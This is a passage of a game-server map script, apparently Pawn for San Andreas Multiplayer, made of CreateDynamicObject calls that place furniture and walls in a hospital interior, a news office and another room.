	CreateDynamicObject(1806, 1138.84338, -2508.42139, 112.82207,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1208, 1136.25183, -2543.27197, 112.81425,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1208, 1136.25183, -2542.59863, 112.81425,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1778, 1136.28833, -2543.70654, 112.81425,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1789, 1135.93604, -2546.63525, 113.37044,   0.00000, 0.00000, 250.00000);
	CreateDynamicObject(2146, 1140.49597, -2523.57251, 113.30552,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2202, 1134.40002, -2535.08130, 112.81425,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2700, 1135.66870, -2539.66846, 115.65992,   1.73959, 6.25290, 267.80945);
	CreateDynamicObject(2700, 1129.75964, -2531.23022, 115.27544,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3389, 1123.01990, -2518.43213, 111.06421,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3386, 1126.78101, -2509.99927, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3387, 1121.24219, -2504.14355, 112.77199,   0.00000, 0.00000, 179.75000);
	CreateDynamicObject(14455, 1131.33960, -2545.60986, 114.48602,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2163, 1126.03943, -2545.52441, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2163, 1126.04004, -2543.76660, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2164, 1121.04126, -2545.63257, 112.81425,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2167, 1121.03687, -2543.87671, 112.81425,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1808, 1125.00610, -2547.24341, 112.81425,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1721, 1137.90161, -2538.72656, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1721, 1137.90161, -2538.07910, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1721, 1137.90161, -2537.43164, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1721, 1137.90161, -2539.37402, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1721, 1137.90161, -2540.04639, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1721, 1137.90161, -2540.69336, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1721, 1137.90161, -2541.34082, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1721, 1122.98621, -2521.00317, 112.81425,   0.00000, 0.00000, 259.75000);
	CreateDynamicObject(1721, 1137.90161, -2542.73535, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1721, 1137.90161, -2543.40771, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2380, 1134.37610, -2539.52075, 114.00241,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1997, 1123.79077, -2517.37305, 112.81425,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1997, 1123.79077, -2522.56909, 112.81425,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1997, 1123.79077, -2528.61719, 112.81425,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1997, 1123.79077, -2525.76831, 112.81425,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1997, 1135.67847, -2518.42261, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1997, 1135.67847, -2521.24683, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1997, 1135.67847, -2528.44678, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(3077, 1132.71509, -2505.15576, 112.82207,   0.00000, 0.00000, 276.00000);
	CreateDynamicObject(1997, 1122.90710, -2504.19434, 112.82207,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3502, 1119.73425, -2504.19971, 114.22760,   0.00000, 209.74994, 270.25000);
	CreateDynamicObject(3084, 1118.69446, -2506.66675, 112.76488,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3084, 1121.07043, -2506.64478, 116.88985,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1523, 1126.42517, -2506.70898, 112.82207,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3386, 1126.71387, -2507.07935, 112.32204,   0.00000, 0.00000, 271.50000);
	CreateDynamicObject(3387, 1122.18445, -2509.01807, 112.82199,   0.00000, 0.00000, 179.74731);
	CreateDynamicObject(3388, 1122.18445, -2508.03076, 112.82207,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3857, 1121.19714, -2506.70166, 117.21912,   0.00000, 0.00000, 225.00000);
	CreateDynamicObject(3396, 1126.79150, -2504.27124, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1704, 1128.76587, -2543.34229, 112.81425,   0.00000, 0.00000, 170.25000);
	CreateDynamicObject(1671, 1128.51892, -2540.18213, 113.27447,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1714, 1123.51672, -2540.08301, 112.81425,   0.00000, 0.00000, 4.00000);
	CreateDynamicObject(2206, 1129.44958, -2541.56665, 112.81425,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2605, 1123.56958, -2541.42261, 113.21269,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2356, 1124.29236, -2542.74707, 112.81425,   0.00000, 0.00000, 20.00000);
	CreateDynamicObject(2356, 1122.87634, -2542.77686, 112.81425,   0.00000, 0.00000, 357.99512);
	CreateDynamicObject(627, 1121.52441, -2546.79028, 114.58456,   0.00000, 0.00000, 225.25000);
	CreateDynamicObject(631, 1130.72644, -2546.81348, 113.71442,   0.00000, 0.00000, 20.00000);
	CreateDynamicObject(646, 1138.10327, -2544.48633, 114.23078,   0.00000, 0.00000, 330.25000);
	CreateDynamicObject(644, 1135.30957, -2551.92725, 113.08927,   0.00000, 0.00000, 310.25000);
	CreateDynamicObject(631, 1118.27661, -2535.19067, 113.71442,   0.00000, 0.00000, 279.75000);
	CreateDynamicObject(632, 1119.12292, -2511.90845, 113.17209,   0.00000, 0.00000, 329.75000);
	CreateDynamicObject(1491, 1132.47363, -2510.58008, 112.82207,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1491, 1129.51782, -2547.51196, 112.81425,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1491, 1124.28955, -2547.48389, 112.81425,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1569, 1132.45898, -2510.58887, 112.82207,   0.00000, 0.00000, 359.98901);
	CreateDynamicObject(1569, 1133.32568, -2547.50000, 112.81425,   0.00000, 0.00000, 179.98901);
	CreateDynamicObject(1569, 1128.01221, -2547.50000, 112.81425,   0.00000, 0.00000, 179.98352);
	CreateDynamicObject(1569, 1129.49988, -2547.50610, 112.81425,   0.00000, 0.00000, 359.98901);
	CreateDynamicObject(1569, 1122.78333, -2547.49780, 112.81425,   0.00000, 0.00000, 179.98901);
	CreateDynamicObject(1569, 1124.26160, -2547.50562, 112.81425,   0.00000, 0.00000, 359.98352);
	CreateDynamicObject(1726, 1134.44055, -2551.95386, 112.81425,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1726, 1129.73730, -2551.95386, 112.81425,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1726, 1124.61133, -2551.95386, 112.81425,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(646, 1131.36218, -2550.82861, 114.23078,   0.00000, 0.00000, 310.24902);
	CreateDynamicObject(1727, 1120.85107, -2550.11865, 112.81425,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1808, 1126.21729, -2551.40796, 112.81425,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1721, 1137.90137, -2542.03809, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1721, 1136.32227, -2522.23413, 112.81425,   0.00000, 0.00000, 79.74976);
	CreateDynamicObject(1721, 1136.25989, -2517.10010, 112.81425,   0.00000, 0.00000, 129.74426);
	CreateDynamicObject(1721, 1130.12305, -2514.94873, 112.81425,   0.00000, 0.00000, 179.74304);
	CreateDynamicObject(1721, 1129.42151, -2514.94873, 112.81425,   0.00000, 0.00000, 179.74182);
	CreateDynamicObject(15038, 1136.18372, -2523.97314, 113.43144,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2253, 1125.31384, -2515.08667, 114.99371,   0.00000, 0.00000, 340.00000);
	CreateDynamicObject(2245, 1126.51221, -2544.64282, 114.91297,   0.00000, 0.00000, 60.00000);
	CreateDynamicObject(2194, 1125.81335, -2543.72778, 114.07078,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2289, 1141.06946, -2527.67822, 114.91696,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2287, 1125.57166, -2543.16064, 114.76836,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2284, 1121.68079, -2545.27905, 114.86871,   349.25000, 0.00000, 90.00000);
	CreateDynamicObject(2278, 1126.78821, -2546.39771, 114.98548,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2271, 1127.19348, -2539.93164, 114.73119,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2270, 1129.27795, -2539.92896, 114.73827,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2266, 1128.52002, -2535.06836, 114.63995,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2265, 1133.91650, -2532.04688, 114.58411,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2263, 1135.91919, -2515.31323, 114.64079,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2260, 1123.20300, -2524.71313, 114.64870,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2265, 1124.75073, -2515.44385, 114.83756,   344.50000, 0.00000, 0.00000);
	CreateDynamicObject(2270, 1127.37378, -2511.15039, 114.27529,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 1127.89880, -2506.43848, 112.82207,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1724, 1132.95398, -2507.92285, 112.82207,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2262, 1128.51233, -2502.98291, 114.72665,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2266, 1133.01624, -2509.54175, 114.55720,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1808, 1129.75159, -2510.31909, 112.82207,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3386, 1122.18359, -2510.02051, 112.82207,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1235, 1140.75574, -2514.90967, 113.32514,   0.00000, 0.00000, 20.00000);
	CreateDynamicObject(1723, 1127.89844, -2509.16797, 112.82207,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2373, 1133.32642, -2539.00977, 112.81321,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2373, 1134.97778, -2539.00244, 112.81321,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7191, 1117.62476, -2513.07178, 114.70715,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2146, 1118.19482, -2521.55591, 113.29980,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2146, 1121.11230, -2517.85034, 113.29980,   0.00000, 0.00000, 10.00000);
	CreateDynamicObject(7191, 1141.23425, -2536.91162, 114.58215,   0.00000, 0.00000, 359.99451);
	CreateDynamicObject(2289, 1123.36719, -2539.45996, 115.09165,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2263, 1138.21924, -2519.96899, 114.71783,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1567, 1135.23523, -2510.58911, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1569, 1135.25366, -2510.57080, 112.82207,   0.00000, 0.00000, 179.48901);
	CreateDynamicObject(1569, 1134.97009, -2510.57129, 112.82207,   0.00000, 0.00000, 180.48352);
	
	// ---------------------------- HOSPITAL 2 -------------------------------
	
	CreateDynamicObject(14668, 1241.97754, 316.33203, -12.74219,   0.00000, 0.00000, 155.50049);
	CreateDynamicObject(16500, 1250.81274, 320.83963, -10.74798,   0.00000, 0.00000, 155.54028);
	CreateDynamicObject(16500, 1239.35352, 326.01270, -10.74798,   0.00000, 0.00000, 335.35217);
	CreateDynamicObject(2948, 1247.15527, 325.59375, -12.74219,   0.00000, 0.00000, 244.99512);
	CreateDynamicObject(2948, 1245.40308, 326.37210, -12.74219,   0.00000, 0.00000, 66.34619);
	CreateDynamicObject(2948, 1247.12720, 325.60193, -12.74219,   0.00000, 0.00000, 66.09619);
	CreateDynamicObject(2948, 1245.40234, 326.37207, -12.74219,   0.00000, 0.00000, 245.70691);
	CreateDynamicObject(16500, 1252.00989, 322.11307, -10.74798,   0.00000, 0.00000, 65.97290);
	CreateDynamicObject(16500, 1239.74902, 327.75781, -10.74798,   0.00000, 0.00000, 65.97290);
	CreateDynamicObject(16500, 1235.33691, 329.73535, -10.74798,   0.00000, 0.00000, 65.97290);
	CreateDynamicObject(16500, 1240.55054, 322.84387, -10.74798,   0.00000, 0.00000, 65.97290);
	CreateDynamicObject(16500, 1247.58594, 319.62402, -10.74798,   0.00000, 0.00000, 65.97290);
	CreateDynamicObject(16500, 1256.47546, 320.10950, -10.74798,   0.00000, 0.00000, 65.97290);
	CreateDynamicObject(16500, 1248.91370, 316.69904, -10.77297,   0.00000, 0.00000, 334.99854);
	CreateDynamicObject(1523, 1247.88477, 314.44531, -12.74219,   0.00000, 0.00000, 244.41835);
	CreateDynamicObject(16500, 1246.14551, 310.84180, -10.77297,   0.00000, 0.00000, 334.98962);
	CreateDynamicObject(16500, 1252.14880, 317.80109, -10.77297,   0.00000, 0.00000, 245.26428);
	CreateDynamicObject(1523, 1254.36462, 316.69269, -12.74219,   0.00000, 0.00000, 336.14319);
	CreateDynamicObject(1649, 1248.17285, 314.98782, -8.57648,   0.00000, 0.00000, 244.40540);
	CreateDynamicObject(1649, 1248.17285, 314.98730, -8.60148,   0.00000, 0.00000, 64.36163);
	CreateDynamicObject(1649, 1246.27283, 311.03754, -8.55148,   0.00000, 0.00000, 64.36163);
	CreateDynamicObject(1649, 1246.30090, 311.09235, -8.55148,   0.00000, 0.00000, 244.40186);
	CreateDynamicObject(1649, 1254.16479, 316.79169, -8.57645,   0.00000, 0.00000, 335.97522);
	CreateDynamicObject(1649, 1254.16406, 316.79102, -8.57645,   0.00000, 0.00000, 155.72510);
	CreateDynamicObject(16500, 1247.32373, 307.67590, -10.77297,   0.00000, 0.00000, 245.75934);
	CreateDynamicObject(16500, 1251.80969, 305.65091, -10.77297,   0.00000, 0.00000, 245.75940);
	CreateDynamicObject(16500, 1243.76367, 311.42090, -10.77297,   0.00000, 0.00000, 245.75867);
	CreateDynamicObject(1523, 1241.49548, 312.37070, -12.74219,   0.00000, 0.00000, 244.42029);
	CreateDynamicObject(1523, 1240.27075, 309.60211, -12.74219,   0.00000, 0.00000, 65.72797);
	CreateDynamicObject(16500, 1247.50244, 307.82385, -10.77297,   0.00000, 0.00000, 65.71851);
	CreateDynamicObject(16500, 1252.05347, 305.75854, -10.77297,   0.00000, 0.00000, 65.71472);
	CreateDynamicObject(1649, 1240.60669, 310.42484, -8.60148,   0.00000, 0.00000, 64.60791);
	CreateDynamicObject(1649, 1240.60645, 310.42480, -8.60148,   0.00000, 0.00000, 244.06482);
	CreateDynamicObject(16500, 1239.35999, 326.08981, -10.74798,   0.00000, 0.00000, 155.89246);
	CreateDynamicObject(16500, 1239.72461, 327.66138, -10.74798,   0.00000, 0.00000, 245.43292);
	CreateDynamicObject(16500, 1235.31458, 329.69034, -10.74798,   0.00000, 0.00000, 245.43292);
	CreateDynamicObject(1533, 1234.31519, 309.46381, -12.74219,   0.00000, 0.00000, 155.50513);
	CreateDynamicObject(1533, 1232.99585, 310.07184, -12.74219,   0.00000, 0.00000, 155.50049);
	CreateDynamicObject(16500, 1238.01563, 310.55383, -10.77297,   0.00000, 0.00000, 245.75867);
	CreateDynamicObject(16500, 1234.83643, 309.34338, -10.77297,   0.00000, 0.00000, 335.48840);
	CreateDynamicObject(1649, 1238.71875, 306.44983, -8.60148,   0.00000, 0.00000, 64.60510);
	CreateDynamicObject(1649, 1238.67871, 306.48254, -8.60148,   0.00000, 0.00000, 244.06128);
	CreateDynamicObject(16500, 1238.48389, 305.86618, -12.24794,   0.00000, 0.00000, 335.48401);
	CreateDynamicObject(1523, 1239.58984, 308.04517, -12.74219,   0.00000, 0.00000, 65.72571);
	CreateDynamicObject(16500, 1231.15173, 310.99179, -10.77297,   0.00000, 0.00000, 156.02393);
	CreateDynamicObject(16500, 1233.19141, 315.54788, -10.77297,   0.00000, 0.00000, 156.02234);
	CreateDynamicObject(1523, 1234.16479, 317.82318, -12.74219,   0.00000, 0.00000, 64.95856);
	CreateDynamicObject(1523, 1235.37109, 320.58069, -12.74219,   0.00000, 0.00000, 245.49683);
	CreateDynamicObject(16500, 1236.36914, 322.84473, -10.77297,   0.00000, 0.00000, 156.02234);
	CreateDynamicObject(1649, 1234.76709, 319.18820, -8.59538,   0.00000, 0.00000, 65.00464);
	CreateDynamicObject(1649, 1236.58801, 323.16397, -8.54538,   0.00000, 0.00000, 65.98560);
	CreateDynamicObject(1649, 1232.92041, 315.24493, -8.54538,   0.00000, 0.00000, 65.00464);
	CreateDynamicObject(1649, 1234.76660, 319.18750, -8.59538,   0.00000, 0.00000, 244.96059);
	CreateDynamicObject(1649, 1232.97607, 315.24399, -8.54538,   0.00000, 0.00000, 246.19165);
	CreateDynamicObject(1649, 1236.59753, 323.12589, -8.59538,   0.00000, 0.00000, 245.20667);
	CreateDynamicObject(3395, 1232.95813, 325.62491, -12.74219,   0.00000, 0.00000, 156.00500);
	CreateDynamicObject(3383, 1229.17004, 312.88651, -12.74219,   0.00000, 0.00000, 335.68018);
	CreateDynamicObject(3383, 1235.95825, 327.98694, -12.74219,   0.00000, 0.00000, 155.96655);
	CreateDynamicObject(1997, 1236.24475, 309.35019, -12.74219,   0.00000, 0.00000, 65.77496);
	CreateDynamicObject(1997, 1236.72546, 310.39508, -12.74219,   0.00000, 0.00000, 65.76965);
	CreateDynamicObject(3383, 1229.52942, 317.27881, -12.74219,   0.00000, 0.00000, 245.69653);
	CreateDynamicObject(2008, 1241.20190, 324.26700, -12.74219,   0.00000, 0.00000, 336.69519);
	CreateDynamicObject(1738, 1240.81738, 326.84961, -12.08756,   0.00000, 0.00000, 335.69275);
	CreateDynamicObject(2146, 1234.80371, 324.82031, -12.25664,   0.00000, 0.00000, 336.17615);
	CreateDynamicObject(1997, 1232.04016, 316.25040, -12.74219,   0.00000, 0.00000, 175.09460);
	CreateDynamicObject(1997, 1248.82654, 304.07025, -12.74219,   0.00000, 0.00000, 155.49963);
	CreateDynamicObject(1997, 1246.90649, 304.92480, -12.74219,   0.00000, 0.00000, 155.49500);
	CreateDynamicObject(1997, 1244.87305, 305.83728, -12.74219,   0.00000, 0.00000, 155.49500);
	CreateDynamicObject(1997, 1244.81934, 309.47733, -12.74219,   0.00000, 0.00000, 335.24963);
	CreateDynamicObject(2162, 1253.01160, 310.06793, -11.24219,   0.00000, 0.00000, 244.41833);
	CreateDynamicObject(2008, 1251.26917, 309.88666, -12.74219,   0.00000, 0.00000, 66.50244);
	CreateDynamicObject(1726, 1248.90039, 319.74414, -12.74219,   0.00000, 0.00000, 156.54968);
	CreateDynamicObject(2596, 1249.45508, 323.78613, -10.29656,   0.00000, 0.00000, 338.39539);
	CreateDynamicObject(1715, 1241.55798, 322.76785, -12.74219,   0.00000, 0.00000, 156.70996);
	CreateDynamicObject(1720, 1250.06714, 310.47797, -12.74219,   0.00000, 0.00000, 65.82001);
	CreateDynamicObject(2007, 1239.17920, 324.16730, -12.74219,   0.00000, 0.00000, 65.43457);
	CreateDynamicObject(2167, 1251.28076, 321.43665, -12.74219,   0.00000, 0.00000, 64.69995);
	CreateDynamicObject(2167, 1250.51172, 319.78027, -12.74219,   0.00000, 0.00000, 64.69299);
	CreateDynamicObject(2690, 1239.27393, 327.61548, -11.28875,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1808, 1246.33704, 320.47070, -12.74219,   0.00000, 0.00000, 155.67529);
	CreateDynamicObject(1714, 1252.76184, 310.21146, -12.74219,   0.00000, 0.00000, 246.90088);
	CreateDynamicObject(1720, 1250.44446, 311.32257, -12.74219,   0.00000, 0.00000, 65.81909);
	CreateDynamicObject(2146, 1251.83618, 317.28320, -12.25664,   0.00000, 0.00000, 245.00635);
	CreateDynamicObject(2167, 1245.82532, 309.92209, -12.74219,   0.00000, 0.00000, 64.69299);
	CreateDynamicObject(2007, 1251.34546, 307.54480, -12.74219,   0.00000, 0.00000, 246.36035);
	CreateDynamicObject(2000, 1250.98633, 306.63806, -12.74219,   0.00000, 0.00000, 246.11035);
	CreateDynamicObject(1727, 1236.46252, 321.43970, -12.74219,   0.00000, 0.00000, 65.72992);
	CreateDynamicObject(1726, 1246.81396, 319.24847, -12.74219,   0.00000, 0.00000, 335.78394);
	CreateDynamicObject(1726, 1243.85376, 312.12213, -12.74219,   0.00000, 0.00000, 156.32092);
	CreateDynamicObject(2855, 1246.18347, 317.07831, -12.66718,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2855, 1246.80884, 316.68179, -12.21718,   0.00000, 0.00000, 322.97522);
	CreateDynamicObject(2855, 1248.94165, 321.79312, -12.21718,   0.00000, 0.00000, 359.75000);
	CreateDynamicObject(1738, 1246.50134, 312.30136, -12.08756,   0.00000, 0.00000, 244.38344);
	CreateDynamicObject(1738, 1253.85608, 312.57608, -12.08756,   0.00000, 0.00000, 244.37988);
	CreateDynamicObject(2596, 1247.68323, 315.02133, -10.29656,   0.00000, 0.00000, 230.45618);
	CreateDynamicObject(2596, 1242.10974, 321.77347, -10.29656,   0.00000, 0.00000, 359.31458);
	CreateDynamicObject(2315, 1247.90137, 322.11005, -12.74219,   0.00000, 0.00000, 335.71021);
	CreateDynamicObject(2315, 1246.10486, 317.15662, -12.74219,   0.00000, 0.00000, 335.70923);
	CreateDynamicObject(2380, 1254.35303, 320.86847, -11.49442,   0.00000, 0.00000, 335.16516);
	CreateDynamicObject(2816, 1246.20117, 317.14130, -12.24656,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2852, 1247.99146, 322.01169, -12.24656,   0.00000, 0.00000, 0.00000);
	
	// ---------------------------- NEWS -------------------------------------
	
	CreateDynamicObject(19376, 247.74001, 1783.13000, 700.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 258.23999, 1783.14001, 700.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 247.74001, 1773.55005, 700.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 258.22897, 1773.51001, 700.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19450, 250.44000, 1784.43994, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 245.63000, 1779.93994, 701.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 253.91000, 1780.12000, 701.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 253.03000, 1775.83997, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19404, 252.33000, 1778.41003, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 249.64999, 1777.30005, 701.65002,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(19388, 246.66000, 1775.83997, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 252.38000, 1778.39001, 702.42999,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1502, 249.13000, 1776.76001, 699.95001,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(2165, 251.81000, 1777.84998, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 248.53999, 1774.62000, 701.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1714, 252.63000, 1777.00000, 700.09003,   0.00000, 0.00000, 230.00000);
	CreateDynamicObject(2007, 253.70000, 1776.69995, 700.01001,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1961, 250.82001, 1775.96997, 701.85999,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1962, 251.55000, 1775.96997, 701.85999,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1960, 252.27000, 1775.96997, 701.85999,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1569, 247.05000, 1784.39001, 700.02002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1569, 250.03000, 1784.39001, 700.02002,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1703, 251.10001, 1783.83997, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1703, 246.23000, 1779.16003, 700.09003,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2315, 247.52000, 1779.45996, 700.09003,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2315, 251.39000, 1782.50000, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2250, 251.42000, 1782.51001, 701.03003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2250, 247.52000, 1780.31006, 701.03003,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2852, 252.61000, 1782.48999, 700.58002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 247.42000, 1779.67004, 700.58002,   0.00000, 0.00000, 39.00000);
	CreateDynamicObject(2011, 246.21001, 1783.96997, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2011, 253.24001, 1779.06995, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 245.88000, 1775.81006, 699.95001,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 245.63000, 1770.30005, 701.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, 250.13000, 1773.12000, 701.65002,   0.00000, 0.00000, 90.40000);
	CreateDynamicObject(19388, 252.80000, 1774.22998, 701.65002,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1502, 252.28999, 1773.68994, 699.95001,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1265, 250.63000, 1775.48999, 700.15997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1265, 250.35001, 1774.87000, 700.15997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1778, 253.53000, 1775.81006, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2712, 253.57001, 1775.31995, 700.67999,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1221, 249.31000, 1773.68005, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1221, 250.27000, 1773.93994, 700.38000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1221, 249.56000, 1775.12000, 700.38000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1265, 249.17999, 1774.35999, 700.15997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 249.17999, 1768.97998, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1705, 246.30000, 1770.17004, 700.09003,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1705, 247.85001, 1769.63000, 700.09003,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1705, 251.83000, 1769.63000, 700.09003,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2315, 248.60001, 1769.55005, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2855, 248.78000, 1769.55005, 700.58002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2251, 249.67000, 1769.35999, 701.40997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 249.91000, 1769.75000, 700.69000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 250.08000, 1769.65002, 700.69000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2817, 248.02000, 1783.18005, 700.08002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 254.81000, 1780.65002, 701.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14393, 255.23000, 1759.94995, 702.32001,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 261.73001, 1768.97998, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 249.19000, 1768.82996, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 255.31000, 1768.97998, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 255.31000, 1768.82996, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 261.73001, 1768.82996, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(14391, 256.13000, 1760.85999, 701.04999,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1705, 257.10999, 1767.64001, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1705, 258.67999, 1767.02002, 700.09003,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2332, 259.63000, 1764.35999, 700.38000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(638, 254.72000, 1765.19995, 701.42999,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(638, 258.07001, 1765.19995, 701.42999,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 256.39999, 1765.18005, 701.09998,   0.00000, 0.00000, 80.00000);
